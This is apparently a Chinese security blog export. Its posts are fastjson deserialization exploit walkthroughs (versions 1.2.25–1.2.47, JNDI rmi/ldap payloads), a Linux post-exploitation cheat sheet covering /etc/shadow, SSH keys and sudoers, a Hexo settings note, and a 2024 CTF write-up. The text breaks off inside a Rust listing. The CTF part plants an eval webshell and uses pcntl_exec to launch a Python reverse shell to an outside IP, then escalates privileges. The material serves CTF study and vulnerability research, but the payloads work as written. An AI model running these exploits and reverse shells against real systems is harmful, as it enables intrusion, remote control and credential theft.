<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1/exp&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第二种poc</strong></p>
<p>绕过检测<code>L</code>和<code>;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="关于JdbcRowSetImpl链利用的分析"><a href="#关于JdbcRowSetImpl链利用的分析" class="headerlink" title="关于JdbcRowSetImpl链利用的分析"></a>关于JdbcRowSetImpl链利用的分析</h4><p>从上面我们学习了绕过黑白名单的学习，接下来看<code>JdbcRowSetImpl</code>利用链的原理。 根据<code>FastJson</code>反序列化漏洞原理，<code>FastJson</code>将<code>JSON</code>字符串反序列化到指定的<code>Java</code>类时，会调用目标类的<code>getter</code>、<code>setter</code>等方法。<code>JdbcRowSetImpl</code>类的<code>setAutoCommit()</code>会调用<code>connect()</code>方法</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233254635.png"></p>
<p><code>connect()</code>函数如下</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326233412606.png"></p>
<p>我们注意这两行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">InitialContext var1 = new InitialContext();</span><br><span class="line">DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());</span><br></pre></td></tr></table></figure>

<p>执行过程是从命名和目录服务中查找指定名称的数据源，并将其赋值给 <code>var2</code> 变量</p>
<p>我们可以用下面demo测试下，成功弹出计算器</p>
<figure class="highlight plaintext"><figcaption><span>org.example;</span></figcaption><table><tr><td class="code"><pre><span class="line">import com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();</span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1:1099/ift2ty&quot;);</span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以说为什么之前的两种<code>poc</code>可以直接自定义<code>uri</code>利用成功。</p>
<h3 id="fastjson-1-2-42-反序列化漏洞"><a href="#fastjson-1-2-42-反序列化漏洞" class="headerlink" title="fastjson 1.2.42 反序列化漏洞"></a>fastjson 1.2.42 反序列化漏洞</h3><p>导入<code>fastjson 1.2.25</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson_1_2_42&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.42&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>我们找到ParserConfig.class反编译一下得到java文件</p>
<p>注意到<code>checkAutoType</code>这里进行判断，仅仅是把原来的<code>L</code>和<code>;</code>换成了<code>hash</code>的形式</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240326235721296.png"></p>
<p>所以直接双写<code>L</code>和<code>;</code>即可，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-43-反序列化漏洞"><a href="#fastjson-1-2-43-反序列化漏洞" class="headerlink" title="fastjson 1.2.43 反序列化漏洞"></a>fastjson 1.2.43 反序列化漏洞</h3><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.43</code>。 直接全局搜索<code>checkAutoType</code>，看修改后的代码</p>
<p><img src="/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/image-20240327000034710.png"></p>
<p>如果出现连续的两个<code>L</code>就报错，但是并没有对<code>[</code>限制，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-44-mappings缓存导致反序列化漏洞"><a href="#fastjson-1-2-44-mappings缓存导致反序列化漏洞" class="headerlink" title="fastjson 1.2.44 mappings缓存导致反序列化漏洞"></a>fastjson 1.2.44 mappings缓存导致反序列化漏洞</h3><p>修改之前的<code>pom.xml</code>里面的版本为<code>1.2.44</code>。 这个版本的<code>fastjson</code>总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说<code>fastjson 1.2.25</code>版本的第一种<code>poc</code>的那个通过<code>mappings</code>缓存绕过<code>checkAutoType</code>的漏洞，poc如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fastjson-1-2-47-mappings缓存导致反序列化漏洞"><a href="#fastjson-1-2-47-mappings缓存导致反序列化漏洞" class="headerlink" title="fastjson 1.2.47 mappings缓存导致反序列化漏洞"></a>fastjson 1.2.47 mappings缓存导致反序列化漏洞</h3><p>poc同上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        // ldap 和 rmi都可以</span><br><span class="line">        String payload = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集</title>
    <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
    <content><![CDATA[<p>渗透测试的信息搜集</p>
<span id="more"></span>

<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong>鹰图</strong> <a href="https://hunter.qianxin.com/">平台链接</a></p>
<p><strong>360网络空间测绘</strong> <a href="https://quake.360.net/quake/#/index">平台链接</a></p>
<p><strong>FOFA</strong> <a href="https://fofa.info/">平台链接</a></p>
<h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><p><strong>版本信息</strong></p>
<ul>
<li><p><code>uname -a</code> 所有版本</p>
</li>
<li><p><code>uname -r</code> 内核版本信息</p>
</li>
<li><p><code>uname -n</code> 系统主机名字</p>
</li>
<li><p><code>uname -m</code> Linux内核架构</p>
</li>
<li><p>文件系统 <code>df -a</code></p>
</li>
</ul>
<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
<li><p>列出系统所有用户 <code>cat /etc/passwd</code></p>
</li>
<li><p>列出所有用户hash（root） <code>cat /etc/shadow</code></p>
</li>
<li><p>查询用户的基本信息 finger</p>
</li>
<li><p>当前登录的用户 users who -a &#x2F;var&#x2F;log&#x2F;utmp</p>
</li>
<li><p>查询无密码用户 grep ‘x:0:’ &#x2F;etc&#x2F;passwd</p>
</li>
<li><p>目前登录的用户 <code>w</code></p>
</li>
<li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p>
</li>
<li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p>
</li>
<li><p>登录成功日志 <code>/var/log/secure</code></p>
</li>
<li><p>登录失败日志 <code>/var/log/faillog</code></p>
</li>
<li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p>
</li>
<li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p>
</li>
<li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><p>查看具有sudo权限的用户</p>
<p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
</li>
</ul>
<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
<li>打印系统环境信息 <code>env</code></li>
<li>打印系统环境信息 <code>set</code></li>
<li>环境变量中的路径信息 <code>echo $PATH</code></li>
<li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li>
<li>显示当前路径 <code>pwd</code></li>
<li>显示默认系统遍历 <code>cat /etc/profile</code></li>
<li>显示可用的shell <code>cat /etc/shells</code></li>
</ul>
<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul>
<li>查看进程信息 <code>ps aux</code></li>
<li>资源占有情况 <code>top -c</code></li>
<li>查看进程关联文件 <code>lsof -c $PID</code></li>
<li>完整命令行信息 <code>/proc/$PID/cmdline</code></li>
<li>进程的命令名 <code>/proc/$PID/comm</code></li>
<li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li>
<li>运行程序的符号链接 <code>/proc/$PID/exe</code></li>
<li>进程的环境变量 <code>/proc/$PID/environ</code></li>
<li>进程打开文件的情况 <code>/proc/$PID/fd</code></li>
</ul>
<h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul>
<li><code>~/.ssh</code></li>
<li><code>/etc/ssh</code></li>
</ul>
<h3 id="日志信息"><a href="#日志信息" class="headerlink" title="日志信息"></a>日志信息</h3><ul>
<li><code>/var/log/*</code></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>博客常用设置</title>
    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
<span id="more"></span>



<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>



<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>



<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>红明谷杯2024</title>
    <url>/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024.html</url>
    <content><![CDATA[<p>pcntl_exec绕过disable_function限制、Rust语言</p>
<span id="more"></span>

<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><blockquote>
<p>php版本为8.3.2</p>
</blockquote>
<p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// flag.php</span><br><span class="line">if (isset($_POST[&#x27;f&#x27;])) &#123;</span><br><span class="line">    echo hash_file(&#x27;md5&#x27;, $_POST[&#x27;f&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>注意到<code>hash_file</code>函数，有点像侧信道攻击的<code>file</code>函数，去网上搜到有关<code>fliter_chains</code>的<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">exp</a></p>
<p>该脚本可利用函数<code>file()</code> 、 <code>hash_file()</code> 、 <code>file_get_contents()</code> 或 <code>copy()</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 filters_chain_oracle_exploit.py --target url --file &#x27;flag.php&#x27; --parameter f</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240404112621747.png"></p>
<p>爆出来参数为ezphpPhp8，加上参数就可以看到<code>flag.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;ezphpPhp8&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;No&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$a = new class &#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag()</span><br><span class="line">    &#123;</span><br><span class="line">        system(&#x27;cat /flag&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unset($a);</span><br><span class="line">$a = $_GET[&#x27;ezphpPhp8&#x27;];</span><br><span class="line">$f = new $a();</span><br><span class="line">$f-&gt;getflag();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后这里的 $a 是匿名类，但是 unset 会销毁变量，这下不会了</p>
<p>这个时候要找一下如何触发一个匿名类 <a href="https://hi-arkin.com/archives/php-anonymous-stdClass.html">参考文章</a></p>
<p>匿名类的类名与文件所在行列相关，即同一个位置实例出来的类为同一个类</p>
<p>也就是说虽然被销毁了但是我们实例化出来是一样的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$obj=new class&#123;&#125;;</span><br><span class="line">// class名为: &#x27;class@anonymous&#x27;+chr(0)+php文件路径+行数$列数</span><br><span class="line">echo get_class($obj);</span><br></pre></td></tr></table></figure>

<p>payload如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/flag.php?ezphpPhp8=<span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>%00/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">flag</span>.<span class="title">php</span>:7$0</span></span><br></pre></td></tr></table></figure>

<p>这里的列数是随机的，bp抓包爆破一下即可</p>
<h1 id="unauth"><a href="#unauth" class="headerlink" title="unauth"></a>unauth</h1><p>打开题目有个弹框登录</p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403200058890.png"></p>
<p>扫目录发现有日志文件泄露，得到admin密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-01-01 12:34:56]  Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036</span><br></pre></td></tr></table></figure>

<p>成功登录，源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!isset($_SERVER[&#x27;PHP_AUTH_USER&#x27;])) &#123;</span><br><span class="line">    header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">    header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">    echo &#x27;小明是运维工程师，最近网站老是出现bug。&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $validUser = &#x27;admin&#x27;;</span><br><span class="line">    $validPass = &#x27;2e525e29e465f45d8d7c56319fe73036&#x27;;</span><br><span class="line"></span><br><span class="line">    if ($_SERVER[&#x27;PHP_AUTH_USER&#x27;] != $validUser || $_SERVER[&#x27;PHP_AUTH_PW&#x27;] != $validPass) &#123;</span><br><span class="line">        header(&#x27;WWW-Authenticate: Basic realm=&quot;Restricted Area&quot;&#x27;);</span><br><span class="line">        header(&#x27;HTTP/1.0 401 Unauthorized&#x27;);</span><br><span class="line">        echo &#x27;Invalid credentials&#x27;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>尝试查看phpinfo发现不行，写个马蚁剑连接先</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br></pre></td></tr></table></figure>

<p>记得下面的请求信息带上请求头<code>Authorization：Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=</code></p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212517974.png"></p>
<p>查看<code>php.ini</code>，禁用函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink</span><br></pre></td></tr></table></figure>

<p>我们在php拓展注意到<code>pcntl.so</code></p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403212849023.png"></p>
<p>去网上搜到利用<code>pcntl_exec</code>绕过disable_function限制 <a href="https://cn-sec.com/archives/228037.html">参考文章</a></p>
<p>并且此函数刚好没有被禁用，payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?cmd=?&gt;&lt;?=eval($_POST[1]);</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">1=?&gt;&lt;?php pcntl_exec(&quot;/usr/bin/python&quot;,array(&#x27;-c&#x27;, &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;47.242.11.183&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;));?&gt;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell后，尝试suid提权，发现有su命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su admin</span><br></pre></td></tr></table></figure>

<p>密码在<code>config.inc.php</code></p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403221132681.png"></p>
<p>成功提权得到flag</p>
<p><img src="/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024/image-20240403213853106.png"></p>
<h1 id="playground"><a href="#playground" class="headerlink" title="playground"></a>playground</h1><blockquote>
<p>Rust</p>
</blockquote>
<p>源码如下</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[macro_use]</span> <span class="keyword">extern</span> <span class="keyword">crate</span> rocket;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">use</span> std::fs;  </span><br><span class="line"><span class="keyword">use</span> std::fs::File;  </span><br><span class="line"><span class="keyword">use</span> std::io::Write;  </span><br><span class="line"><span class="keyword">use</span> std::process::Command;  </span><br><span class="line"><span class="keyword">use</span> rand::Rng;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">index</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;  </span><br><span class="line">    fs::<span class="title function_ invoke__">read_to_string</span>(<span class="string">&quot;main.rs&quot;</span>).<span class="title function_ invoke__">unwrap_or</span>(<span class="type">String</span>::<span class="title function_ invoke__">default</span>())  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/rust_code&quot;</span>, data = <span class="string">&quot;&lt;code&gt;&quot;</span>)]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">run_rust_code</span>(code: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> code.<span class="title function_ invoke__">contains</span>(<span class="string">&quot;std&quot;</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: std is not allowed&quot;</span>.<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//generate a random 5 length file name  </span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">file_name</span> = rand::<span class="title function_ invoke__">thread_rng</span>()  </span><br><span class="line">        .<span class="title function_ invoke__">sample_iter</span>(&amp;rand::distributions::Alphanumeric)  </span><br><span class="line">        .<span class="title function_ invoke__">take</span>(<span class="number">5</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">map</span>(<span class="type">char</span>::from)  </span><br><span class="line">        .collect::&lt;<span class="type">String</span>&gt;();  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(<span class="keyword">mut</span> file) = File::<span class="title function_ invoke__">create</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>, &amp;file_name)) &#123;  </span><br><span class="line">        file.<span class="title function_ invoke__">write_all</span>(code.<span class="title function_ invoke__">as_bytes</span>());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(build_output) = Command::<span class="title function_ invoke__">new</span>(<span class="string">&quot;rustc&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;debuginfo=0&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;opt-level=3&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-o&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !build_output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(build_output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span 